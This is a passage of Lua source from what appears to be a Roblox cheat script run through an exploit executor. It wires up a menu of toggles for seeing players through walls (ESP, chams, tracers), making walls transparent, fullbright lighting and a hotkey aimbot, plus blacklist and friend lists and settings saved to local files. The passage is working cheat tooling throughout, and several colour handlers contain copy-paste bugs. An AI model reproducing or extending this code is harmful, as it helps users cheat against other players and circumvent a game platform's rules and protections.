				MobESPButton.Text = tostring(Bullshit.MobESP)
				MobESPButton.TextSize = 14
				MobESPButton.TextWrapped = true

				MobChamsButton.Name = "MobChamsButton"
				MobChamsButton.Parent = buttons_3
				MobChamsButton.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				MobChamsButton.BackgroundTransparency = 0.5
				MobChamsButton.BorderSizePixel = 0
				MobChamsButton.Position = UDim2.new(1, -150, 0, 390)
				MobChamsButton.Size = UDim2.new(0, 135, 0, 20)
				MobChamsButton.Font = Enum.Font.SourceSansBold
				MobChamsButton.Text = tostring(Bullshit.MobChams)
				MobChamsButton.TextSize = 14
				MobChamsButton.TextWrapped = true

				TextLabel_2.Parent = buttons_3
				TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_2.BackgroundTransparency = 1
				TextLabel_2.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_2.Font = Enum.Font.SourceSansBold
				TextLabel_2.Text = "Tracers Length"
				TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_2.TextSize = 16
				TextLabel_2.TextTransparency = 0.5

				TextLabel_3.Parent = buttons_3
				TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_3.BackgroundTransparency = 1
				TextLabel_3.Position = UDim2.new(0, 0, 0, 30)
				TextLabel_3.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_3.Font = Enum.Font.SourceSansBold
				TextLabel_3.Text = "ESP Length"
				TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_3.TextSize = 16
				TextLabel_3.TextTransparency = 0.5

				TextLabel_4.Parent = buttons_3
				TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_4.BackgroundTransparency = 1
				TextLabel_4.Position = UDim2.new(0, 0, 0, 60)
				TextLabel_4.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_4.Font = Enum.Font.SourceSansBold
				TextLabel_4.Text = "Chams Length"
				TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_4.TextSize = 16
				TextLabel_4.TextTransparency = 0.5

				TextLabel_5.Parent = buttons_3
				TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_5.BackgroundTransparency = 1
				TextLabel_5.Position = UDim2.new(0, 0, 0, 90)
				TextLabel_5.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_5.Font = Enum.Font.SourceSansBold
				TextLabel_5.Text = "Tracers Under Chars"
				TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_5.TextSize = 16
				TextLabel_5.TextTransparency = 0.5

				TextLabel_6.Parent = buttons_3
				TextLabel_6.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_6.BackgroundTransparency = 1
				TextLabel_6.Position = UDim2.new(0, 0, 0, 270)
				TextLabel_6.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_6.Font = Enum.Font.SourceSansBold
				TextLabel_6.Text = "Crosshair Color"
				TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_6.TextSize = 16
				TextLabel_6.TextTransparency = 0.5

				TextLabel_7.Parent = buttons_3
				TextLabel_7.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_7.BackgroundTransparency = 1
				TextLabel_7.Position = UDim2.new(0, 0, 0, 120)
				TextLabel_7.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_7.Font = Enum.Font.SourceSansBold
				TextLabel_7.Text = "Free For All"
				TextLabel_7.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_7.TextSize = 16
				TextLabel_7.TextTransparency = 0.5

				TextLabel_8.Parent = buttons_3
				TextLabel_8.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_8.BackgroundTransparency = 1
				TextLabel_8.Position = UDim2.new(0, 0, 0, 240)
				TextLabel_8.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_8.Font = Enum.Font.SourceSansBold
				TextLabel_8.Text = "Neutral Color"
				TextLabel_8.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_8.TextSize = 16
				TextLabel_8.TextTransparency = 0.5

				TextLabel_9.Parent = buttons_3
				TextLabel_9.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_9.BackgroundTransparency = 1
				TextLabel_9.Position = UDim2.new(0, 0, 0, 150)
				TextLabel_9.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_9.Font = Enum.Font.SourceSansBold
				TextLabel_9.Text = "Enemy Color"
				TextLabel_9.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_9.TextSize = 16
				TextLabel_9.TextTransparency = 0.5

				TextLabel_10.Parent = buttons_3
				TextLabel_10.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_10.BackgroundTransparency = 1
				TextLabel_10.Position = UDim2.new(0, 0, 0, 180)
				TextLabel_10.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_10.Font = Enum.Font.SourceSansBold
				TextLabel_10.Text = "Ally Color"
				TextLabel_10.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_10.TextSize = 16
				TextLabel_10.TextTransparency = 0.5

				TextLabel_11.Parent = buttons_3
				TextLabel_11.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_11.BackgroundTransparency = 1
				TextLabel_11.Position = UDim2.new(0, 0, 0, 210)
				TextLabel_11.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_11.Font = Enum.Font.SourceSansBold
				TextLabel_11.Text = "Friend Color"
				TextLabel_11.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_11.TextSize = 16
				TextLabel_11.TextTransparency = 0.5

				TextLabel_12.Parent = buttons_3
				TextLabel_12.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_12.BackgroundTransparency = 1
				TextLabel_12.Position = UDim2.new(0, 0, 0, 300)
				TextLabel_12.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_12.Font = Enum.Font.SourceSansBold
				TextLabel_12.Text = "Aimlock Auto Fire"
				TextLabel_12.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_12.TextSize = 16
				TextLabel_12.TextTransparency = 0.5

				TextLabel_13.Parent = buttons_3
				TextLabel_13.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_13.BackgroundTransparency = 1
				TextLabel_13.Position = UDim2.new(0, 0, 0, 330)
				TextLabel_13.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_13.Font = Enum.Font.SourceSansBold
				TextLabel_13.Text = "Aimbot Key"
				TextLabel_13.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_13.TextSize = 16
				TextLabel_13.TextTransparency = 0.5

				TextLabel_14.Parent = buttons_3
				TextLabel_14.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_14.BackgroundTransparency = 1
				TextLabel_14.Position = UDim2.new(0, 0, 0, 360)
				TextLabel_14.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_14.Font = Enum.Font.SourceSansBold
				TextLabel_14.Text = "Mob ESP"
				TextLabel_14.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_14.TextSize = 16
				TextLabel_14.TextTransparency = 0.5

				TextLabel_15.Parent = buttons_3
				TextLabel_15.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel_15.BackgroundTransparency = 1
				TextLabel_15.Position = UDim2.new(0, 0, 0, 390)
				TextLabel_15.Size = UDim2.new(0.5, 0, 0, 20)
				TextLabel_15.Font = Enum.Font.SourceSansBold
				TextLabel_15.Text = "Mob CHAMS"
				TextLabel_15.TextColor3 = Color3.new(1, 1, 1)
				TextLabel_15.TextSize = 16
				TextLabel_15.TextTransparency = 0.5

				SaveSettings.Name = "SaveSettings"
				SaveSettings.Parent = buttons_3
				SaveSettings.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				SaveSettings.BackgroundTransparency = 0.5
				SaveSettings.BorderSizePixel = 0
				SaveSettings.Position = UDim2.new(0, 0, 0, 420)
				SaveSettings.Size = UDim2.new(1, -15, 0, 20)
				SaveSettings.Font = Enum.Font.SourceSansBold
				SaveSettings.Text = "Save Settings"
				SaveSettings.TextSize = 14
				SaveSettings.TextWrapped = true

				function CreatePlayerLabel(Str, frame)
					local n = #frame:GetChildren()
					local playername = Instance.new("TextLabel")
					playername.Name = Str
					playername.Parent = frame
					playername.BackgroundColor3 = Color3.new(1, 1, 1)
					playername.BackgroundTransparency = 1
					playername.BorderSizePixel = 0
					playername.Position = UDim2.new(0, 5, 0, (n * 15))
					playername.Size = UDim2.new(1, -25, 0, 15)
					playername.Font = Enum.Font.SourceSans
					playername.Text = Str
					playername.TextColor3 = Color3.new(1, 1, 1)
					playername.TextSize = 16
					playername.TextXAlignment = Enum.TextXAlignment.Left
				end

				function RefreshPlayerLabels(frame, t)
					frame:ClearAllChildren()
					for i, v in next, t do
						CreatePlayerLabel(i, frame)
					end
				end

				RefreshPlayerLabels(players, Bullshit.Blacklist)
				RefreshPlayerLabels(players2, Bullshit.FriendList)

				ESPToggle.MouseButton1Click:connect(function()
					Bullshit.ESPEnabled = not Bullshit.ESPEnabled
					if Bullshit.ESPEnabled then
						ESPToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						for _, v in next, Plrs:GetPlayers() do
							if v ~= MyPlr then
								if Bullshit.CharAddedEvent[v.Name] == nil then
									Bullshit.CharAddedEvent[v.Name] = v.CharacterAdded:connect(function(Char)
										if Bullshit.ESPEnabled then
											RemoveESP(v)
											CreateESP(v)
										end
										if Bullshit.CHAMSEnabled then
											RemoveChams(v)
											CreateChams(v)
										end
										if Bullshit.TracersEnabled then
											RemoveTracers(v)
											CreateTracers(v)
										end
										repeat wait() until Char:FindFirstChild("HumanoidRootPart")
										TracerMT[v.Name] = Char.HumanoidRootPart
									end)
								end
								RemoveESP(v)
								CreateESP(v)
							end
						end
						CreateMobESPChams()
					else
						ESPToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						PlayerESP:ClearAllChildren()
						ItemESP:ClearAllChildren()
					end
				end)

				ChamsToggle.MouseButton1Click:connect(function()
					Bullshit.CHAMSEnabled = not Bullshit.CHAMSEnabled
					if Bullshit.CHAMSEnabled then
						ChamsToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						for _, v in next, Plrs:GetPlayers() do
							if v ~= MyPlr then
								if Bullshit.CharAddedEvent[v.Name] == nil then
									Bullshit.CharAddedEvent[v.Name] = v.CharacterAdded:connect(function(Char)
										if Bullshit.ESPEnabled then
											RemoveESP(v)
											CreateESP(v)
										end
										if Bullshit.CHAMSEnabled then
											RemoveChams(v)
											CreateChams(v)
										end
										if Bullshit.TracersEnabled then
											RemoveTracers(v)
											CreateTracers(v)
										end
										repeat wait() until Char:FindFirstChild("HumanoidRootPart")
										TracerMT[v.Name] = Char.HumanoidRootPart
									end)
								end
								RemoveChams(v)
								CreateChams(v)
							end
						end
						CreateMobESPChams()
					else
						ChamsToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						PlayerChams:ClearAllChildren()
						ItemChams:ClearAllChildren()
					end
				end)

				TracersToggle.MouseButton1Click:connect(function()
					Bullshit.TracersEnabled = not Bullshit.TracersEnabled
					if Bullshit.TracersEnabled then
						TracersToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						for _, v in next, Plrs:GetPlayers() do
							if v ~= MyPlr then
								if Bullshit.CharAddedEvent[v.Name] == nil then
									Bullshit.CharAddedEvent[v.Name] = v.CharacterAdded:connect(function(Char)
										if Bullshit.ESPEnabled then
											RemoveESP(v)
											CreateESP(v)
										end
										if Bullshit.CHAMSEnabled then
											RemoveChams(v)
											CreateChams(v)
										end
										if Bullshit.TracersEnabled then
											RemoveTracers(v)
											CreateTracers(v)
										end
									end)
								end
								if v.Character ~= nil then
									local Tor = v.Character:FindFirstChild("HumanoidRootPart")
									if Tor then
										TracerMT[v.Name] = Tor
									end
								end
								RemoveTracers(v)
								CreateTracers(v)
							end
						end
					else
						TracersToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						for _, v in next, Plrs:GetPlayers() do
							RemoveTracers(v)
						end
					end
				end)

				DebugToggle.MouseButton1Click:connect(function()
					Bullshit.DebugInfo = not Bullshit.DebugInfo
					DebugMenu["Main"].Visible = Bullshit.DebugInfo
					if Bullshit.DebugInfo then
						DebugToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
					else
						DebugToggle.BackgroundColor3 = Color3.new(1, 1, 1)
					end
				end)

				OutlineToggle.MouseButton1Click:connect(function()
					Bullshit.OutlinesEnabled = not Bullshit.OutlinesEnabled
					if Bullshit.OutlinesEnabled then
						OutlineToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						for _, v in next, workspace:GetDescendants() do
							if v:IsA("BasePart") and not Plrs:GetPlayerFromCharacter(v.Parent) and not v.Parent:IsA("Hat") and not v.Parent:IsA("Accessory") and v.Parent.Name ~= "Tracers" then
								local Data = { }
								Data[2] = v.Transparency
								v.Transparency = 1
								local outline = Instance.new("SelectionBox")
								outline.Name = "Outline"
								outline.Color3 = Color3.new(0, 0, 0)
								outline.SurfaceColor3 = Color3.new(0, 1, 0)
								--outline.SurfaceTransparency = 0.9
								outline.LineThickness = 0.01
								outline.Transparency = 0.3
								outline.Adornee = v
								outline.Parent = v
								Data[1] = outline
								rawset(Bullshit.OutlinedParts, v, Data)
							end
							CreateChildAddedEventFor(v)
						end
						CreateChildAddedEventFor(workspace)
						if Bullshit.LightingEvent == nil then
							Bullshit.LightingEvent = game:GetService("Lighting").Changed:connect(LightingHax)
						end
					else
						OutlineToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						for i, v in next, Bullshit.OutlinedParts do
							i.Transparency = v[2]
							v[1]:Destroy()
						end
					end
				end)

				FullbrightToggle.MouseButton1Click:connect(function()
					Bullshit.FullbrightEnabled = not Bullshit.FullbrightEnabled
					if Bullshit.FullbrightEnabled then
						FullbrightToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						if Bullshit.LightingEvent == nil then
							Bullshit.LightingEvent = Light.Changed:connect(LightingHax)
						end
					else
						FullbrightToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						Light.Ambient = Bullshit.AmbientBackup
						Light.ColorShift_Bottom = Bullshit.ColorShiftBotBackup
						Light.ColorShift_Top = Bullshit.ColorShiftTopBackup
					end
				end)

				Crosshair.MouseButton1Click:connect(function()
					Bullshit.CrosshairEnabled = not Bullshit.CrosshairEnabled
					if Bullshit.CrosshairEnabled then
						local g = Instance.new("ScreenGui", CoreGui)
						g.Name = "Corsshair"
						local line1 = Instance.new("TextLabel", g)
						line1.Text = ""
						line1.Size = UDim2.new(0, 35, 0, 1)
						line1.BackgroundColor3 = Bullshit.Colors.Crosshair
						line1.BorderSizePixel = 0
						line1.ZIndex = 10
						local line2 = Instance.new("TextLabel", g)
						line2.Text = ""
						line2.Size = UDim2.new(0, 1, 0, 35)
						line2.BackgroundColor3 = Bullshit.Colors.Crosshair
						line2.BorderSizePixel = 0
						line2.ZIndex = 10

						local viewport = MyCam.ViewportSize
						local centerx = viewport.X / 2
						local centery = viewport.Y / 2

						line1.Position = UDim2.new(0, centerx - (35 / 2), 0, centery - 35)
						line2.Position = UDim2.new(0, centerx, 0, centery - (35 / 2) - 35)

						Crosshair.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
					else
						local find = CoreGui:FindFirstChild("Corsshair")
						if find then
							find:Destroy()
						end

						Crosshairs.BackgroundColor3 = Color3.new(1, 1, 1)
					end
				end)

				AimbotToggle.MouseButton1Click:connect(function()
					if not (game.PlaceId == 292439477 or game.PlaceId == 606849621) then
						Bullshit.AimbotEnabled = not Bullshit.AimbotEnabled
						if Bullshit.AimbotEnabled then
							AimbotToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						else
							AimbotToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						end
					else
						local hint = Instance.new("Hint", CoreGui)
						hint.Text = "This game prevents camera manipulation!"
						wait(5)
						hint:Destroy()
					end
				end)

				TracersUnderChars.MouseButton1Click:connect(function()
					Bullshit.PlaceTracersUnderCharacter = not Bullshit.PlaceTracersUnderCharacter
					if Bullshit.PlaceTracersUnderCharacter then
						TracersUnderChars.Text = "true"
					else
						TracersUnderChars.Text = "false"
					end
				end)

				FreeForAll.MouseButton1Click:connect(function()
					Bullshit.FreeForAll = not Bullshit.FreeForAll
					if Bullshit.FreeForAll then
						FreeForAll.Text = "true"
					else
						FreeForAll.Text = "false"
					end
				end)

				ESPLength.FocusLost:connect(function()
					local txt = ESPLength.Text
					local num = tonumber(txt) or 10000
					if num ~= nil then
						if num < 100 then
							num = 100
							ESPLength.Text = num
						elseif num > 10000 then
							num = 10000
							ESPLength.Text = num
						end
					end

					Bullshit.ESPLength = num
					ESPLength.Text = num
				end)

				CHAMSLength.FocusLost:connect(function()
					local txt = CHAMSLength.Text
					local num = tonumber(txt) or 500
					if num ~= nil then
						if num < 100 then
							num = 100
							CHAMSLength.Text = num
						elseif num > 2048 then
							num = 2048
							CHAMSLength.Text = num
						end
					end

					Bullshit.CHAMSLength = num
					CHAMSLength.Text = num
				end)

				TracersLength.FocusLost:connect(function()
					local txt = TracersLength.Text
					local num = tonumber(txt) or 500
					if num ~= nil then
						if num < 100 then
							num = 100
							TracersLength.Text = num
						elseif num > 2048 then
							num = 2048
							TracersLength.Text = num
						end
					end

					Bullshit.TracersLength = num
					TracersLength.Text = num
				end)

				EnemyColor.FocusLost:connect(function()
					local R, G, B = string.match(RemoveSpacesFromString(EnemyColor.Text), "(%d+),(%d+),(%d+)")
					R = tonumber(R)
					G = tonumber(G)
					B = tonumber(B)
					if R > 1 then
						R = R / 255
					end
					if G > 1 then
						G = G / 255
					end
					if B > 1 then
						B = B / 255
					end

					if R ~= nil and G ~= nil and B ~= nil then
						if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
							Bullshit.Colors.Enemy = Color3.new(R, G, B)
							EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
						else
							EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
						end
					else
						EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
					end
				end)

				AllyColor.FocusLost:connect(function()
					local R, G, B = string.match(RemoveSpacesFromString(AllyColor.Text), "(%d+),(%d+),(%d+)")
					R = tonumber(R)
					G = tonumber(G)
					B = tonumber(B)
					if R > 1 then
						R = R / 255
					end
					if G > 1 then
						G = G / 255
					end
					if B > 1 then
						B = B / 255
					end

					if R ~= nil and G ~= nil and B ~= nil then
						if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
							Bullshit.Colors.Ally = Color3.new(R, G, B)
							AllyColor.Text = tostring(Bullshit.Colors.Ally)
						else
							AllyColor.Text = tostring(Bullshit.Colors.Ally)
						end
					else
						AllyColor.Text = tostring(Bullshit.Colors.Ally)
					end
				end)

				FriendColor.FocusLost:connect(function()
					local R, G, B = string.match(RemoveSpacesFromString(FriendColor.Text), "(%d+),(%d+),(%d+)")
					R = tonumber(R)
					G = tonumber(G)
					B = tonumber(B)
					if R > 1 then
						R = R / 255
					end
					if G > 1 then
						G = G / 255
					end
					if B > 1 then
						B = B / 255
					end

					if R ~= nil and G ~= nil and B ~= nil then
						if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
							Bullshit.Colors.Ally = Color3.new(R, G, B)
							FriendColor.Text = tostring(Bullshit.Colors.Friend)
						else
							FriendColor.Text = tostring(Bullshit.Colors.Friend)
						end
					else
						FriendColor.Text = tostring(Bullshit.Colors.Friend)
					end
				end)

				NeutralColor.FocusLost:connect(function()
					local R, G, B = string.match(RemoveSpacesFromString(NeutralColor.Text), "(%d+),(%d+),(%d+)")
					R = tonumber(R)
					G = tonumber(G)
					B = tonumber(B)
					if R > 1 then
						R = R / 255
					end
					if G > 1 then
						G = G / 255
					end
					if B > 1 then
						B = B / 255
					end

					if R ~= nil and G ~= nil and B ~= nil then
						if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
							Bullshit.Colors.Ally = Color3.new(R, G, B)
							NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
						else
							NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
						end
					else
						NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
					end
				end)

				CrosshairColor.FocusLost:connect(function()
					local R, G, B = string.match(RemoveSpacesFromString(CrosshairColor.Text), "(%d+),(%d+),(%d+)")
					R = tonumber(R)
					G = tonumber(G)
					B = tonumber(B)
					if R > 1 then
						R = R / 255
					end
					if G > 1 then
						G = G / 255
					end
					if B > 1 then
						B = B / 255
					end

					if R ~= nil and G ~= nil and B ~= nil then
						if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
							Bullshit.Colors.Ally = Color3.new(R, G, B)
							EnemyColor.Text = tostring(Bullshit.Colors.Crosshair)
						else
							EnemyColor.Text = tostring(Bullshit.Colors.Crosshair)
						end
					else
						EnemyColor.Text = tostring(Bullshit.Colors.Crosshair)
					end
				end)

				AutoFireToggle.MouseButton1Click:connect(function()
					local hint = Instance.new("Hint", CoreGui)
					hint.Text = "Currently broken. :("
					wait(3)
					hint:Destroy()
					--Bullshit.AutoFire = not Bullshit.AutoFire
					--AutoFireToggle.Text = tostring(Bullshit.AutoFire)
				end)

				AimbotKey.MouseButton1Click:connect(function()
					AimbotKey.Text = "Press any Key now."
					local input = UserInput.InputBegan:wait()
					if input.UserInputType == Enum.UserInputType.Keyboard then
						Bullshit.AimbotKey = tostring(input.KeyCode)
						AimbotKey.Text = string.sub(tostring(input.KeyCode), 14)
					else
						Bullshit.AimbotKey = tostring(input.UserInputType)
						AimbotKey.Text = string.sub(tostring(input.UserInputType), 20)
					end
				end)

				MobESPButton.MouseButton1Click:connect(function()
					Bullshit.MobESP = not Bullshit.MobESP
					MobESPButton.Text = tostring(Bullshit.MobESP)
					if Bullshit.MobESP then
						local hint = Instance.new("Hint", CoreGui)
						hint.Text = "Turn ESP/Chams off and on again to see mob ESP."
						wait(5)
						hint.Text = "This is still in beta, expect problems! Message Racist Dolphin#5199 on discord if you encounter a bug!"
						wait(10)
						hint:Destroy()
					end
				end)

				MobChamsButton.MouseButton1Click:connect(function()
					Bullshit.MobChams = not Bullshit.MobChams
					MobChamsButton.Text = tostring(Bullshit.MobChams)
					if Bullshit.MobChams then
						local hint = Instance.new("Hint", CoreGui)
						hint.Text = "Turn ESP/Chams off and on again to see mob chams."
						wait(5)
						hint.Text = "This is still in beta, expect problems! Message Racist Dolphin#5199 on discord if you encounter a bug!"
						wait(10)
						hint:Destroy()
					end
				end)

				Playername.FocusLost:connect(function()
					local FindPlr = FindPlayer(Playername.Text)
					if FindPlr then
						Playername.Text = FindPlr.Name
					elseif not Bullshit.Blacklist[Playername.Text] then
						Playername.Text = "Player not Found!"
						wait(1)
						Playername.Text = "Enter Player Name"
					end
				end)

				AddToBlacklist.MouseButton1Click:connect(function()
					local FindPlr = FindPlayer(Playername.Text)
					if FindPlr then
						if not Bullshit.Blacklist[FindPlr.Name] then
							Bullshit.Blacklist[FindPlr.Name] = true
							UpdateChams(FindPlr)
							CreatePlayerLabel(FindPlr.Name, players)
						end
					end
				end)

				RemoveToBlacklist.MouseButton1Click:connect(function()
					local FindPlr = FindPlayer(Playername.Text)
					if FindPlr then
						if Bullshit.Blacklist[FindPlr.Name] then
							Bullshit.Blacklist[FindPlr.Name] = nil
							UpdateChams(FindPlr)
							RefreshPlayerLabels(players, Bullshit.Blacklist)
						end
					else
						if Bullshit.Blacklist[Playername.Text] then
							Bullshit.Blacklist[Playername.Text] = nil
							RefreshPlayerLabels(players, Bullshit.Blacklist)
						end
					end
				end)

				Playername2.FocusLost:connect(function()
					local FindPlr = FindPlayer(Playername2.Text)
					if FindPlr then
						Playername2.Text = FindPlr.Name
					elseif not Bullshit.FriendList[Playername2.Text] then
						Playername2.Text = "Player not Found!"
						wait(1)
						Playername2.Text = "Enter Player Name"
					end
				end)

				AddToWhitelist.MouseButton1Click:connect(function()
					local FindPlr = FindPlayer(Playername2.Text)
					if FindPlr then
						if not Bullshit.FriendList[FindPlr.Name] then
							Bullshit.FriendList[FindPlr.Name] = true
							UpdateChams(FindPlr)
							CreatePlayerLabel(FindPlr.Name, players2)
						end
					end
				end)

				RemoveToWhitelist.MouseButton1Click:connect(function()
					local FindPlr = FindPlayer(Playername2.Text)
					if FindPlr then
						if Bullshit.FriendList[FindPlr.Name] then
							Bullshit.FriendList[FindPlr.Name] = nil
							UpdateChams(FindPlr)
							RefreshPlayerLabels(players2, Bullshit.FriendList)
						end
					else
						if Bullshit.FriendList[Playername2.Text] then
							Bullshit.FriendList[Playername2.Text] = nil
							RefreshPlayerLabels(players2, Bullshit.FriendList)
						end
					end
				end)

				SaveWhitelist.MouseButton1Click:connect(function()
					pcall(function()
						writefile("Whitelist.txt", HTTP:JSONEncode(Bullshit.FriendList))
					end)
					SaveWhitelist.Text = "Saved!"
					wait(1)
					SaveWhitelist.Text = "Save Friends List"
				end)

				SaveBlacklist.MouseButton1Click:connect(function()
					pcall(function()
						writefile("Blacklist.txt", HTTP:JSONEncode(Bullshit.Blacklist))
					end)
					SaveBlacklist.Text = "Saved!"
					wait(1)
					SaveBlacklist.Text = "Save Blacklist"
				end)

				Settings.MouseButton1Click:connect(function()
					Settings_2.Visible = not Settings_2.Visible
					Information_2.Visible = false
					Blacklist.Visible = false
					Whitelist.Visible = false
					if Settings_2.Visible then
						Settings.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						Information.BackgroundColor3 = Color3.new(1, 1, 1)
						BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
					else
						Settings.BackgroundColor3 = Color3.new(1, 1, 1)
					end
				end)

				Information.MouseButton1Click:connect(function()
					Information_2.Visible = not Information_2.Visible
					Settings_2.Visible = false
					Blacklist.Visible = false
					Whitelist.Visible = false
					if Information_2.Visible then
						Information.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						Settings.BackgroundColor3 = Color3.new(1, 1, 1)
						BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
						WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
					else
						Information.BackgroundColor3 = Color3.new(1, 1, 1)
					end
				end)

				BlacklistToggle.MouseButton1Click:connect(function()
					Blacklist.Visible = not Blacklist.Visible
					Settings_2.Visible = false
					Information_2.Visible = false
					Whitelist.Visible = false
					if Blacklist.Visible then
						BlacklistToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						Settings.BackgroundColor3 = Color3.new(1, 1, 1)
						Information.BackgroundColor3 = Color3.new(1, 1, 1)
						WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
					else
						BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
					end
				end)

				WhitelistToggle.MouseButton1Click:connect(function()
					Whitelist.Visible = not Whitelist.Visible
					Settings_2.Visible = false
					Information_2.Visible = false
					Blacklist.Visible = false
					if Whitelist.Visible then
						WhitelistToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
						Settings.BackgroundColor3 = Color3.new(1, 1, 1)
						Information.BackgroundColor3 = Color3.new(1, 1, 1)
						BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
					else
						WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
					end
				end)

				SaveSettings.MouseButton1Click:connect(function()
					SaveBullshitSettings()
					SaveSettings.Text = "Saved!"
					wait(1)
					SaveSettings.Text = "Save Settings"
				end)

				UserInput.InputBegan:connect(function(input, ingui)
					if not ingui then
						if input.UserInputType == Enum.UserInputType.Keyboard then
							if input.KeyCode == Enum.KeyCode.P then
								MainFrame.Visible = not MainFrame.Visible
							end
						end

						if tostring(input.KeyCode) == Bullshit.AimbotKey or tostring(input.UserInputType) == Bullshit.AimbotKey then
							Bullshit.Aimbot = true
						end
					end
				end)

				UserInput.InputEnded:connect(function(input)
					if tostring(input.KeyCode) == Bullshit.AimbotKey or tostring(input.UserInputType) == Bullshit.AimbotKey then
						Bullshit.Aimbot = false
					end
				end)
			end

			InitMain()

			Run:BindToRenderStep("UpdateESP", Enum.RenderPriority.Character.Value, function()
				for _, v in next, Plrs:GetPlayers() do
					if v ~= MyPlr then
						UpdateESP(v)
					end
				end
			end)

			Run:BindToRenderStep("UpdateInfo", 1000, function()
				Bullshit.ClosestEnemy = GetClosestPlayer()
				MyChar = MyPlr.Character
				if Bullshit.DebugInfo then
					local MyHead, MyTor, MyHum = MyChar:FindFirstChild("Head"), MyChar:FindFirstChild("HumanoidRootPart"), MyChar:FindFirstChild("Humanoid")

					local GetChar, GetHead, GetTor, GetHum = nil, nil, nil, nil
					if Bullshit.ClosestEnemy ~= nil then
						GetChar = Bullshit.ClosestEnemy.Character
						GetHead = GetChar:FindFirstChild("Head")
						GetTor = GetChar:FindFirstChild("HumanoidRootPart")
						GetHum = GetChar:FindFirstChild("Humanoid")

						DebugMenu["PlayerSelected"].Text = "Closest Enemy: " .. tostring(Bullshit.ClosestEnemy)

						if Bullshit.ClosestEnemy.Team ~= nil then
							DebugMenu["PlayerTeam"].Text = "Team: " .. tostring(Bullshit.ClosestEnemy.Team)
						else
							DebugMenu["PlayerTeam"].Text = "Team: nil"
						end

						if GetHum then
							DebugMenu["PlayerHealth"].Text = "Health: " .. string.format("%.0f", GetHum.Health)
						end
						if MyTor and GetTor then
							local Pos = GetTor.Position
							local Dist = (MyTor.Position - Pos).magnitude
